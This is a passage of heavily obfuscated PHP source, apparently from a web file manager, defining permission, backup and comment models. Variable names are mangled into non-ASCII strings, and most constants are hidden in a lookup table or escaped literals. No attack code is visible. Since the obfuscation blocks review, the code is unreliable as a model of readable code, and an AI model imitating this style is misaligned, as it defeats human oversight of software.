<?php
 goto c¤öš°”„˜; e¡ƒàøãÙé: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÈÕ„î˜˜ =& $_SERVER[ï»»·÷á]; $ßúËºú = array(array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1868]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1870], $ÈÕ„î˜˜[1871] => 1, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1874]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1875], $ÈÕ„î˜˜[1871] => 2, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1876]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1877], $ÈÕ„î˜˜[1871] => 3, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1878]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1879], $ÈÕ„î˜˜[1871] => 4, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1880]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1881], $ÈÕ„î˜˜[1871] => 5, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1882]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1883], $ÈÕ„î˜˜[1871] => 6, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÈÕ„î˜˜[429] => LNG($ÈÕ„î˜˜[1884]), $ÈÕ„î˜˜[1869] => $ÈÕ„î˜˜[1885], $ÈÕ„î˜˜[1871] => 7, $ÈÕ„î˜˜[1872] => 1, $ÈÕ„î˜˜[1873] => 0)); return $ßúËºú; } public static function authCheck($ÙªÑõÂĞ, $àÀÇÌğä) { $Ş³şÚË =& $_SERVER[ï»»·÷á]; $ÙªÑõÂĞ = intval($ÙªÑõÂĞ); if ($GLOBALS[$Ş³şÚË[503]] && $GLOBALS[$Ş³şÚË[6]][$Ş³şÚË[1886]]) { return !0; } if ($ÙªÑõÂĞ <= 0) { return !1; } if (($ÙªÑõÂĞ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÙªÑõÂĞ & $àÀÇÌğä); } public static function authCheckShow($­¾ ëÓ´) { return self::authCheck($­¾ ëÓ´, self::AUTH_SHOW); } public static function authCheckView($™‚€½õ§) { return self::authCheck($™‚€½õ§, self::AUTH_VIEW); } public static function authCheckDownload($×ŞÃù‘) { return self::authCheck($×ŞÃù‘, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ÆšÂ§ÓŠ) { return self::authCheck($ÆšÂ§ÓŠ, self::AUTH_UPLOAD); } public static function authCheckEdit($ÜùÁ¤¹) { return self::authCheck($ÜùÁ¤¹, self::AUTH_EDIT); } public static function authCheckRemove($À´…‰Ö¶) { return self::authCheck($À´…‰Ö¶, self::AUTH_REMOVE); } public static function authCheckShare($ÙŸ£Ìâ…) { return self::authCheck($ÙŸ£Ìâ…, self::AUTH_SHARE); } public static function authCheckComment($’Ú´ÌÖó) { return self::authCheck($’Ú´ÌÖó, self::AUTH_COMMENT); } public static function authCheckEvent($™ûÂë¼Œ) { return self::authCheck($™ûÂë¼Œ, self::AUTH_EVENT); } public static function authCheckRoot($Œ‹´½É·) { return self::authCheck($Œ‹´½É·, self::AUTH_ROOT); } public static function authCheckAction($Õ—‚¸ç¿, $¨óÀ¹ˆº) { $ãÅ¥À¶Î =& $_SERVER[ï»»·÷á]; $ß’ ºö¹ = array($ãÅ¥À¶Î[1887] => self::AUTH_VIEW, $ãÅ¥À¶Î[1204] => self::AUTH_DOWNLOAD, $ãÅ¥À¶Î[107] => self::AUTH_UPLOAD, $ãÅ¥À¶Î[1837] => self::AUTH_EDIT, $ãÅ¥À¶Î[1836] => self::AUTH_REMOVE, $ãÅ¥À¶Î[1847] => self::AUTH_SHARE, $ãÅ¥À¶Î[354] => self::AUTH_COMMENT, $ãÅ¥À¶Î[1666] => self::AUTH_EVENT, $ãÅ¥À¶Î[1888] => self::AUTH_ROOT); if (!isset($ß’ ºö¹[$¨óÀ¹ˆº])) { return; } $Êáí„© = $ß’ ºö¹[$¨óÀ¹ˆº]; $Õ—‚¸ç¿ = intval($Õ—‚¸ç¿); if ($Õ—‚¸ç¿ <= 0) { return !1; } if (($Õ—‚¸ç¿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Õ—‚¸ç¿ & $Êáí„©); } public static function authDisable($¾ıŠ²·, $üõ°¤©) { if (intval($¾ıŠ²·) <= 0) { return 0; } return intval($¾ıŠ²·) & ~$üõ°¤©; } public $optionType = "\123\171\x73\164\x65\155\56\163\x6f\165\x72\x63\145\x41\165\x74\x68\x4c\151\x73\164"; public $field = array("\156\141\x6d\145", "\141\x75\164\x68", "\x6c\141\x62\x65\x6c", "\x64\x69\x73\160\154\x61\x79", "\x73\171\163\x74\145\x6d", "\x73\157\x72\164"); public function initData() { $ı²­Ú¥ = $this->authDefault(); foreach ($ı²­Ú¥ as $›õ®ˆé¼) { $this->add($›õ®ˆé¼); } } public function findAuth($í§ßƒû, $­Šƒè«) { $€ËÒ¦÷† =& $_SERVER[ï»»·÷á]; $šî¯¥ûÆ = parent::listData(); foreach ($šî¯¥ûÆ as $ØæéÌ) { $ğ•´úãİ = intval($ØæéÌ[$€ËÒ¦÷†[422]]); if ($ğ•´úãİ <= 0 || $ØæéÌ[$€ËÒ¦÷†[1889]] == 0) { continue; } if (($ğ•´úãİ & $í§ßƒû) != $í§ßƒû) { continue; } if (($ğ•´úãİ & $­Šƒè«) != 0) { continue; } return $ØæéÌ[$€ËÒ¦÷†[399]]; } return !1; } public function findAuthReadOnly() { $¤Õ« = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Ø•Í±ÖÚ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($¤Õ«, $Ø•Í±ÖÚ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $î«Å«âí =& $_SERVER[ï»»·÷á]; $©…Œº”µ = parent::listData(); $İ¸øéó› = !1; foreach ($©…Œº”µ as $½¢ÍĞŞ‹) { if ($½¢ÍĞŞ‹[$î«Å«âí[422]] <= 0 || $½¢ÍĞŞ‹[$î«Å«âí[1889]] == $î«Å«âí[198]) { continue; } if (!$İ¸øéó›) { $İ¸øéó› = $½¢ÍĞŞ‹; continue; } if ($İ¸øéó›[$î«Å«âí[422]] > $½¢ÍĞŞ‹[$î«Å«âí[422]]) { $İ¸øéó› = $½¢ÍĞŞ‹; } } return $İ¸øéó› ? $İ¸øéó›[$î«Å«âí[399]] : $î«Å«âí[12]; } public function listData($øù©ùÆ× = false, $’úı¯ï = "\x73\157\162\x74", $ÎÇàş = false) { return parent::listData($øù©ùÆ×, $’úı¯ï, $ÎÇàş); } public function update($õõ½­ˆ€, $±¦ë¸©) { $ÂÆéŠ”ï =& $_SERVER[ï»»·÷á]; $Ø¡¶±ê = parent::listData($õõ½­ˆ€); $üÂ¨ÖìÀ = $this->findByName($±¦ë¸©[$ÂÆéŠ”ï[32]]); if (!$Ø¡¶±ê || $üÂ¨ÖìÀ && $üÂ¨ÖìÀ[$ÂÆéŠ”ï[399]] != $Ø¡¶±ê[$ÂÆéŠ”ï[399]]) { return !1; } $this->filterAuth($±¦ë¸©[$ÂÆéŠ”ï[422]]); return parent::update($õõ½­ˆ€, $±¦ë¸©); } public function remove($ÉôÕá‰æ) { $«‡¡Şù = parent::listData($ÉôÕá‰æ); if (!$«‡¡Şù || $«‡¡Şù[$_SERVER[ï»»·÷á][1294]]) { return !1; } return parent::remove($ÉôÕá‰æ); } public function add($æÜƒ°‰á = array()) { $çƒÉöÍØ =& $_SERVER[ï»»·÷á]; if ($this->findByName($æÜƒ°‰á[$çƒÉöÍØ[32]])) { return !1; } $Šı·¥øß = array($çƒÉöÍØ[32] => $çƒÉöÍØ[12], $çƒÉöÍØ[422] => 1, $çƒÉöÍØ[1890] => $çƒÉöÍØ[1877], $çƒÉöÍØ[1889] => 1, $çƒÉöÍØ[1294] => 0, $çƒÉöÍØ[1891] => 0); $æÜƒ°‰á = array_merge($Šı·¥øß, $æÜƒ°‰á); $æÜƒ°‰á[$çƒÉöÍØ[1891]] = $this->getSort(); $this->filterAuth($æÜƒ°‰á[$çƒÉöÍØ[422]]); return parent::insert($æÜƒ°‰á); } private function getSort() { $ì“è³Ñ„ =& $_SERVER[ï»»·÷á]; $×ª »®ñ = parent::listData(); $¯ê¡‰Ù× = array_to_keyvalue($×ª »®ñ, $ì“è³Ñ„[12], $ì“è³Ñ„[1891]); return empty($¯ê¡‰Ù×) ? 0 : max($¯ê¡‰Ù×) + 1; } private function filterAuth(&$„Ü×Å‡) { if (!$„Ü×Å‡) { return; } $‹õÓùÉ² = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Öàãï° = array(); foreach ($‹õÓùÉ² as $µŸÛÇ¨û) { if ($„Ü×Å‡ & $µŸÛÇ¨û) { $Öàãï°[] = $µŸÛÇ¨û; } } if (in_array(self::AUTH_ROOT, $Öàãï°)) { $„Ü×Å‡ = array_sum($‹õÓùÉ²); return; } $ø½Îí = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Öàãï° as $µŸÛÇ¨û) { if (isset($ø½Îí[$µŸÛÇ¨û])) { $Öàãï° = array_merge($Öàãï°, $ø½Îí[$µŸÛÇ¨û]); } } $Öàãï°[] = self::AUTH_SHOW; $„Ü×Å‡ = array_sum(array_unique($Öàãï°)); } public function sort($ÜÈÒìı, $ÀäÙ‘ô) { return parent::update($ÜÈÒìı, $ÀäÙ‘ô); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\x62\x61\x63\153\x75\x70\114\151\x73\x74"; public $field = array("\151\157", "\156\141\155\145", "\x73\x74\x61\164\x75\163", "\x63\157\156\164\x65\x6e\x74", "\155\141\156\x75\141\x6c", "\162\x65\163\x75\x6c\x74", "\164\151\x6d\x65\x46\x72\x6f\x6d", "\x74\x69\x6d\145\x54\x6f"); public function config() { $ÚÛÕ‰ =& $_SERVER[ï»»·÷á]; $•íòÑ˜Š = Model($ÚÛÕ‰[783])->get($ÚÛÕ‰[793]); $•íòÑ˜Š = json_decode($•íòÑ˜Š, !0); $•íòÑ˜Š = is_array($•íòÑ˜Š) ? $•íòÑ˜Š : array(); if (!isset($•íòÑ˜Š[$ÚÛÕ‰[767]])) { $•íòÑ˜Š[$ÚÛÕ‰[767]] = $ÚÛÕ‰[88]; } unset($•íòÑ˜Š[$ÚÛÕ‰[1648]]); Action($ÚÛÕ‰[1892])->taskInit(); Model($ÚÛÕ‰[1647])->cacheClear(); $Æ‰òÚşÙ = $ÚÛÕ‰[1893]; $”òñ ü = Model($ÚÛÕ‰[1894])->findByKey($ÚÛÕ‰[1666], $Æ‰òÚşÙ); if (!$”òñ ü) { $”òñ ü = array(); } if (isset($”òñ ü[$ÚÛÕ‰[180]])) { $”òñ ü[$ÚÛÕ‰[180]] = json_decode($”òñ ü[$ÚÛÕ‰[180]], !0); } if (isset($•íòÑ˜Š[$ÚÛÕ‰[180]])) { $”òñ ü[$ÚÛÕ‰[180]][$ÚÛÕ‰[1651]] = $•íòÑ˜Š[$ÚÛÕ‰[180]]; unset($•íòÑ˜Š[$ÚÛÕ‰[180]]); } return array_merge($”òñ ü, $•íòÑ˜Š); } public function listData($Ó‹áó‚¦ = false, $ŸÖ„îï = "\155\x6f\144\151\146\x79\124\151\155\x65", $®Ş§ÅÏÙ = false) { return parent::listData($Ó‹áó‚¦, $ŸÖ„îï, !0); } public function lastItem() { $½Û¨Ùíé = $this->listData(); return !empty($½Û¨Ùíé[0]) ? $½Û¨Ùíé[0] : null; } public function kill($ÆÜÇ×) { $ĞÑ¢ĞÀ¿ =& $_SERVER[ï»»·÷á]; $Ø¼¯±­ú = $this->listData($ÆÜÇ×); if (!$Ø¼¯±­ú || empty($Ø¼¯±­ú[$ĞÑ¢ĞÀ¿[32]])) { return !0; } Task::kill($ĞÑ¢ĞÀ¿[792]); Task::kill($ĞÑ¢ĞÀ¿[813]); Task::kill($ĞÑ¢ĞÀ¿[822]); $ù€Š†›± = $Ø¼¯±­ú[$ĞÑ¢ĞÀ¿[32]]; $œĞ·×Œ× = TEMP_FILES . $ĞÑ¢ĞÀ¿[791] . $ù€Š†›± . $ĞÑ¢ĞÀ¿[8]; IO::remove($œĞ·×Œ×, !1); return $this->remove($ÆÜÇ×); } public function remove($ˆ§»ëÎâ) { $÷´‡ — = $this->listData($ˆ§»ëÎâ); if (!$÷´‡ —) { return !0; } return $this->backupRemove($÷´‡ —); } private function backupRemove($üÄé˜á½) { parent::remove($üÄé˜á½[$_SERVER[ï»»·÷á][399]]); $ÎãñĞÍ = $this->backupPath($üÄé˜á½); IO::remove($ÎãñĞÍ, !1); return !0; } private function backupPath($ğğ““õ) { $ÌÀÃ”ô² =& $_SERVER[ï»»·÷á]; $‰Å·ğÎÙ = $ğğ““õ[$ÌÀÃ”ô²[32]]; $¯§ğ¨ı¢ = Model($ÌÀÃ”ô²[783])->get($ÌÀÃ”ô²[784]); $¼ÔâıµÊ = substr(md5($ÌÀÃ”ô²[785] . $¯§ğ¨ı¢ . $‰Å·ğÎÙ), 0, 8); return "\173\x69\157\x3a{$ğğ““õ[$ÌÀÃ”ô²[764]]}\x7d\x2f\x64\141\164\x61\x62\141\x73\x65\57\x62\x61\143\x6b\165\160\x2f" . $‰Å·ğÎÙ . $ÌÀÃ”ô²[11] . $¼ÔâıµÊ; } public function start() { $¢Û¯äâı =& $_SERVER[ï»»·÷á]; if ($GLOBALS[$¢Û¯äâı[6]][$¢Û¯äâı[89]][$¢Û¯äâı[1895]] != $¢Û¯äâı[88]) { return !0; } $ĞÂ¿ÍÔÇ = $this->config(); if (!$ĞÂ¿ÍÔÇ || $ĞÂ¿ÍÔÇ[$¢Û¯äâı[1648]] != $¢Û¯äâı[88]) { return !1; } $ÄÄüĞç = $this->process(); foreach ($ÄÄüĞç as $º†üûñ€) { if ($º†üûñ€) { return Task::restart($º†üûñ€[$¢Û¯äâı[399]]); } } $ìæ–æ¡Ü = new Backup(); $ÁÜÉ¾‡ = $ìæ–æ¡Ü->db(); if ($ÁÜÉ¾‡) { $ÁÜÉ¾‡ = $ìæ–æ¡Ü->dbFile(); if ($ÁÜÉ¾‡ && $ĞÂ¿ÍÔÇ[$¢Û¯äâı[767]] == $¢Û¯äâı[198]) { $ÁÜÉ¾‡ = $ìæ–æ¡Ü->file(); } } Backup::set(array($¢Û¯äâı[762] => 1, $¢Û¯äâı[774] => time())); return !0; } public function process() { $¡¦Ê»İÌ =& $_SERVER[ï»»·÷á]; $ÃÖõ×“¹ = array($¡¦Ê»İÌ[770] => Task::get($¡¦Ê»İÌ[792]), $¡¦Ê»İÌ[775] => Task::get($¡¦Ê»İÌ[813]), $¡¦Ê»İÌ[200] => Task::get($¡¦Ê»İÌ[822])); $»í•Ë¡„ = !1; foreach ($ÃÖõ×“¹ as &$ñÎ¿ÀµÁ) { if ($»í•Ë¡„) { $ñÎ¿ÀµÁ = !1; continue; } if ($ñÎ¿ÀµÁ) { $ßª¶Ö¡ = intval(_get($ñÎ¿ÀµÁ, $¡¦Ê»İÌ[1683], 0)); if (time() - $ßª¶Ö¡ > 7200) { Task::kill($ñÎ¿ÀµÁ[$¡¦Ê»İÌ[399]]); $»í•Ë¡„ = !0; $ñÎ¿ÀµÁ = !1; } } } return $ÃÖõ×“¹; } public function restore() { $ÓØ´äœ =& $_SERVER[ï»»·÷á]; ActionCall($ÓØ´äœ[1070], !0, 1); ActionCall($ÓØ´äœ[1070], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\145\x6e\164"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\x6d\x65" => "\143\157\x6d\x6d\x65\156\x74\x5f\155\145\164\141", "\x6d\145\164\x61\x46\151\x65\x6c\x64" => "\x63\157\155\x6d\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¿ÛòåÒÍ) { $Â×­äè– =& $_SERVER[ï»»·÷á]; if ($¿ÛòåÒÍ[$Â×­äè–[1896]]) { $éúçõğá = $this->where(array($Â×­äè–[1897] => $¿ÛòåÒÍ[$Â×­äè–[1896]]))->find(); if (!$éúçõğá || $éúçõğá[$Â×­äè–[420]] != $¿ÛòåÒÍ[$Â×­äè–[420]] || $éúçõğá[$Â×­äè–[505]] != $¿ÛòåÒÍ[$Â×­äè–[505]]) { return !1; } $this->where(array($Â×­äè–[1897] => $¿ÛòåÒÍ[$Â×­äè–[1896]]))->setAdd($Â×­äè–[1898], 1); } $¿ÛòåÒÍ[$Â×­äè–[1899]] = 0; $¿ÛòåÒÍ[$Â×­äè–[1898]] = 0; $¿ÛòåÒÍ[$Â×­äè–[762]] = 1; return $this->add($¿ÛòåÒÍ); } public function commentCount($÷¾è›á, $¤àØáÖÁ, $¥£àâÂ = false) { $ÏÒşè‡ =& $_SERVER[ï»»·÷á]; if (!$÷¾è›á) { return array(); } if (is_string($÷¾è›á) || is_int($÷¾è›á)) { $÷¾è›á = array($÷¾è›á); } $Ä´œ«”¾ = array($ÏÒşè‡[505], $ÏÒşè‡[1900] => $ÏÒşè‡[500]); $úÏª¡”« = array($ÏÒşè‡[505] => array($ÏÒşè‡[7], $÷¾è›á), $ÏÒşè‡[420] => $¤àØáÖÁ); if ($¥£àâÂ) { $úÏª¡”«[$ÏÒşè‡[1678]] = $¥£àâÂ; } $àÑ”ô’ú = $this->field($Ä´œ«”¾)->where($úÏª¡”«)->group($ÏÒşè‡[505])->select(); return array_to_keyvalue($àÑ”ô’ú, $ÏÒşè‡[505], $ÏÒşè‡[500]); } public function starTarget($çÃÂËª, $åÁƒóàª) { $€À©š¨Ã =& $_SERVER[ï»»·÷á]; $¤÷ô§ûğ = $çÃÂËª + self::TYPE_STAR_OFFSET; $ŞæŠ“·ƒ = array($€À©š¨Ã[1678] => USER_ID, $€À©š¨Ã[420] => $¤÷ô§ûğ, $€À©š¨Ã[505] => $åÁƒóàª); $Õ’äÖ‚Æ = $this->where($ŞæŠ“·ƒ)->find(); if ($Õ’äÖ‚Æ) { return $this->where(array($€À©š¨Ã[399] => $Õ’äÖ‚Æ[$€À©š¨Ã[399]]))->delete(); } $²ã”©Çà = array($€À©š¨Ã[1896] => 0, $€À©š¨Ã[1678] => USER_ID, $€À©š¨Ã[762] => 1, $€À©š¨Ã[767] => $€À©š¨Ã[12], $€À©š¨Ã[420] => $¤÷ô§ûğ, $€À©š¨Ã[505] => $åÁƒóàª, $€À©š¨Ã[1899] => 0, $€À©š¨Ã[1898] => 0); return $this->add($²ã”©Çà); } public function starTargetCount($†Ä¨®ë, $ÌôâÕ‘ß) { $ÁµĞ­¹ =& $_SERVER[ï»»·÷á]; $•ëà±Í‘ = $ÌôâÕ‘ß + self::TYPE_STAR_OFFSET; $…ŸŞÃ = $this->commentCount($†Ä¨®ë, $•ëà±Í‘); $ÒúÕ´’¡ = $this->commentCount($†Ä¨®ë, $•ëà±Í‘, USER_ID); return array($ÁµĞ­¹[1901] => $…ŸŞÃ, $ÁµĞ­¹[1902] => $ÒúÕ´’¡); } public function starTargetUserList($îšèê‘æ, $Âˆ¶Çãá) { $“”ó¾Äü =& $_SERVER[ï»»·÷á]; $®Ù“ê“¢ = $îšèê‘æ + self::TYPE_STAR_OFFSET; $¡ó±ÉÍ€ = array($“”ó¾Äü[505] => $Âˆ¶Çãá, $“”ó¾Äü[420] => $®Ù“ê“¢); $İ›ÖãÆ· = $this->where($¡ó±ÉÍ€)->count(); $Â†ËœÃÛ = array($“”ó¾Äü[255] => $İ›ÖãÆ·, $“”ó¾Äü[1903] => array()); if (!$İ›ÖãÆ·) { return $Â†ËœÃÛ; } $áÀ“‘Ûî = $this->field($“”ó¾Äü[1678])->where($¡ó±ÉÍ€)->limit(500)->select(); $áÀ“‘Ûî = array_to_keyvalue($áÀ“‘Ûî, $“”ó¾Äü[12], $“”ó¾Äü[1678]); $Â†ËœÃÛ[$“”ó¾Äü[1903]] = Model($“”ó¾Äü[513])->userListInfo($áÀ“‘Ûî); return $Â†ËœÃÛ; } public function prasiseUserList($èòĞ×’ù) { $¬¯ºÁ™… =& $_SERVER[ï»»·÷á]; $˜ûèå‰Ú = array($¬¯ºÁ™…[1904] => $èòĞ×’ù); $üÍ°³» = $this->where($˜ûèå‰Ú)->find(); $†¬—í´ç = _get($üÍ°³», $¬¯ºÁ™…[1899], 0); $ƒõÏ¢—ù = array($¬¯ºÁ™…[255] => $†¬—í´ç, $¬¯ºÁ™…[1903] => array()); if (!$†¬—í´ç) { return $ƒõÏ¢—ù; } $Ø‡”¼š = Model($¬¯ºÁ™…[1905])->field($¬¯ºÁ™…[1678])->where($˜ûèå‰Ú)->limit(500)->select(); $Ø‡”¼š = array_to_keyvalue($Ø‡”¼š, $¬¯ºÁ™…[12], $¬¯ºÁ™…[1678]); $ƒõÏ¢—ù[$¬¯ºÁ™…[1903]] = Model($¬¯ºÁ™…[513])->userListInfo($Ø‡”¼š); return $ƒõÏ¢—ù; } public function remove($ƒ…×²) { $›Ç€Ìí =& $_SERVER[ï»»·÷á]; $Óæã¼ = array($›Ç€Ìí[1897] => $ƒ…×²); $˜ÜÑ¯ú = $this->where($Óæã¼)->find(); if ($˜ÜÑ¯ú[$›Ç€Ìí[1896]]) { $this->where(array($›Ç€Ìí[1897] => $˜ÜÑ¯ú[$›Ç€Ìí[1896]]))->setAdd($›Ç€Ìí[1898], -1); } return $this->where($Óæã¼)->delete(); } public function edit($ñüÄµÛ¸, $’¤˜– ) { $Ëô‰Šİ— =& $_SERVER[ï»»·÷á]; $¬õÓÓî± = array($Ëô‰Šİ—[1897] => $ñüÄµÛ¸); return $this->where($¬õÓÓî±)->save(array($Ëô‰Šİ—[1906] => $’¤˜– )); } public function prasise($Â­Î¦Š) { $„àµ÷ˆ÷ =& $_SERVER[ï»»·÷á]; $í«û¯Ü = Model($„àµ÷ˆ÷[1907]); $å¨øŠĞ = array($„àµ÷ˆ÷[1897] => $Â­Î¦Š, $„àµ÷ˆ÷[1669] => USER_ID); $‹ƒ±Ú¸Ó = $í«û¯Ü->where($å¨øŠĞ)->find(); if (!$‹ƒ±Ú¸Ó) { $í«û¯Ü->add($å¨øŠĞ); $¼´ÛåÄË = $this->where(array($„àµ÷ˆ÷[1897] => $Â­Î¦Š))->setAdd($„àµ÷ˆ÷[1899], 1); } else { $í«û¯Ü->where($å¨øŠĞ)->delete(); $¼´ÛåÄË = $this->where(array($„àµ÷ˆ÷[1897] => $Â­Î¦Š))->setAdd($„àµ÷ˆ÷[1899], -1); } return $¼´ÛåÄË; } public function targetInfo($¡ÅØ¹ˆû, $¢Ş“€‰ß) { $ß×¬´¨« =& $_SERVER[ï»»·÷á]; $¿Ş‡Ï = array($ß×¬´¨«[585] => $¡ÅØ¹ˆû, $ß×¬´¨«[586] => $¢Ş“€‰ß); $•é€ş = $this->where($¿Ş‡Ï)->count(); $İÉ·‘® = "\122\111\107\110\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\143\157\155\x6d\145\156\164\x5f\160\x72\141\x69\163\x65\x20\x73\164\x61\x72\x20\x6f\156\x20\143\157\x6d\x6d\x65\156\x74\x2e\143\157\x6d\x6d\145\156\164\111\104\x20\x3d\x20\x73\164\141\162\x2e\x63\157\155\155\x65\x6e\164\111\x44"; $ïêŸÌ¹ = $this->alias($ß×¬´¨«[354])->where($¿Ş‡Ï)->join($İÉ·‘®, $ß×¬´¨«[1908])->count(); $•²—Ó· = array($ß×¬´¨«[1909] => $•é€ş, $ß×¬´¨«[1910] => $ïêŸÌ¹); return $•²—Ó·; } public function listData($Ò¶›®Ç½) { $¹½‹ş°Ë =& $_SERVER[ï»»·÷á]; if (isset($Ò¶›®Ç½[$¹½‹ş°Ë[1911]])) { if ($Ò¶›®Ç½[$¹½‹ş°Ë[1911]]) { $Ò¶›®Ç½[$¹½‹ş°Ë[1904]] = array($¹½‹ş°Ë[1024], intval($Ò¶›®Ç½[$¹½‹ş°Ë[1911]])); } unset($Ò¶›®Ç½[$¹½‹ş°Ë[1911]]); } if (isset($Ò¶›®Ç½[$¹½‹ş°Ë[1912]])) { if ($Ò¶›®Ç½[$¹½‹ş°Ë[1912]]) { $Ò¶›®Ç½[$¹½‹ş°Ë[1904]] = array($¹½‹ş°Ë[1021], intval($Ò¶›®Ç½[$¹½‹ş°Ë[1912]])); } unset($Ò¶›®Ç½[$¹½‹ş°Ë[1912]]); } return $this->_listData($Ò¶›®Ç½); } private function _listData($úñµÀ´ƒ) { $Ûâ©ÚßË =& $_SERVER[ï»»·÷á]; $İ£ª‡†Ö = $this->where($úñµÀ´ƒ)->_makeOrder()->selectPage(100); $this->_listAppendParent($İ£ª‡†Ö[$Ûâ©ÚßË[369]]); $this->_listAppendUser($İ£ª‡†Ö[$Ûâ©ÚßË[369]]); $this->_listAppendMeta($İ£ª‡†Ö[$Ûâ©ÚßË[369]]); return $İ£ª‡†Ö; } private function _makeOrder() { $×ÜÖ¥ÆÓ =& $_SERVER[ï»»·÷á]; $¨ã÷ = array($×ÜÖ¥ÆÓ[1899], $×ÜÖ¥ÆÓ[1898], $×ÜÖ¥ÆÓ[201]); $„Ï“¢ = Input::get($×ÜÖ¥ÆÓ[466], $×ÜÖ¥ÆÓ[7], $×ÜÖ¥ÆÓ[432], $¨ã÷); $”ŒìÈŠ  = Input::get($×ÜÖ¥ÆÓ[467], $×ÜÖ¥ÆÓ[7], $×ÜÖ¥ÆÓ[1671], array($×ÜÖ¥ÆÓ[1913], $×ÜÖ¥ÆÓ[462])); $¦µóâíÓ = $„Ï“¢ . $×ÜÖ¥ÆÓ[53] . $”ŒìÈŠ ; return $this->order($¦µóâíÓ); } private function _listAppendParent(&$ØßÙÈÛ) { $Â›È®Îö =& $_SERVER[ï»»·÷á]; $²Ë¾¬„† = array_unique(array_to_keyvalue($ØßÙÈÛ, $Â›È®Îö[12], $Â›È®Îö[1896])); $²Ë¾¬„† = array_remove_value($²Ë¾¬„†, $Â›È®Îö[198]); if (!$²Ë¾¬„†) { return; } $„¸ ßí£ = $this->where(array($Â›È®Îö[1897] => array($Â›È®Îö[7], $²Ë¾¬„†)))->select(); $„¸ ßí£ = array_to_keyvalue($„¸ ßí£, $Â›È®Îö[1904]); foreach ($ØßÙÈÛ as &$şô–Õ—°) { if (isset($„¸ ßí£[$şô–Õ—°[$Â›È®Îö[1896]]])) { $şô–Õ—°[$Â›È®Îö[1914]] = $„¸ ßí£[$şô–Õ—°[$Â›È®Îö[1896]]]; } } unset($şô–Õ—°); } private function _listAppendUser(&$é°İè°) { $»ƒŒ¡´× =& $_SERVER[ï»»·÷á]; $Ë´‘†çŒ = array_unique(array_to_keyvalue($é°İè°, $»ƒŒ¡´×[12], $»ƒŒ¡´×[1678])); $Ë´‘†çŒ = array_remove_value($Ë´‘†çŒ, $»ƒŒ¡´×[198]); if (count($Ë´‘†çŒ) == 0) { return; } foreach ($é°İè° as 